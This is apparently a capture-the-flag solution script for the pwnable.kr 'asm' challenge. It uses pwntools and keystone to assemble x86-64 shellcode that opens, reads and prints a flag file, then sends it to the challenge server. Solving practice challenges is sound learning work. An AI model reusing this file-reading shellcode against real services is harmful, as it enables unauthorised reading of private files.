from pwn import *
from keystone import *

# Shellcode for the open() function
open_shell_code = shellcraft.amd64.open('./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', 0).replace("SYS_open", "2")

# Shellcode for the read() function
read_shell_code = shellcraft.amd64.read('rax', 'rsp', 30)

# Shellcode for the write() function
write_shell_code = shellcraft.amd64.write(1, 'rsp', 30).replace("SYS_write", "1")

'''
print(open_shell_code)
print(read_shell_code)
print(write_shell_code)
'''

assembly = open_shell_code + read_shell_code + write_shell_code

try:
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoded_instructions, _num_of_instruction = ks.asm(assembly)
except KsError as e:
    print(f"[-] {e}")
    print("[-] Bye")
    quit(1)

shellcode = b""
for i in encoded_instructions:
    shellcode += i.to_bytes(length=1, byteorder='little')

r = remote(host='pwnable.kr', port=9026, ssl=False)
print(r.recvuntil(b'give me your x64 shellcode:').decode('utf-8'))
r.sendline(shellcode)
print(f"[+] {r.recvline().decode('utf-8')}")
print("[+] Bye")